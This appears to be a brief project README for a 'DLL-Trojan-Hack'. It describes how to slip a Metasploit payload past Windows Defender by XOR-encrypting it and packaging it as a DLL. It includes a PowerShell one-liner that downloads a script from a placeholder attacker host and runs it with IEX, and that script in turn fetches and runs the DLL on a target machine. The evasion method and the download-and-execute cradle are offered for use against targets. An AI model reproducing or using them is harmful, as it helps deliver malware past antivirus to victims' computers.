# DLL-Trojan-Hack
An intriguing method to bypass Windows Defender's threat detection. All credit goes to <a href="https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html">Purpl3F0x Secur1ty's guide.</a>

Using an encoded payload from Metasploit, a penetration testing framework, we can further enhance the stealth of our executable through XOR encryption, then converting it into a DLL. To run this on a target Windows computer, we can use the following PowerShell command: 
```powershell 
(new-object system.net.webclient).downloadstring("<your-ip>/<your-powershell-script>") | IEX
```
This will grab and run the PowerShell script that grabs and runs the DLL file. <i>Note: you must have Apache (or something similar) installed and running on your host machine for this to work.</i>
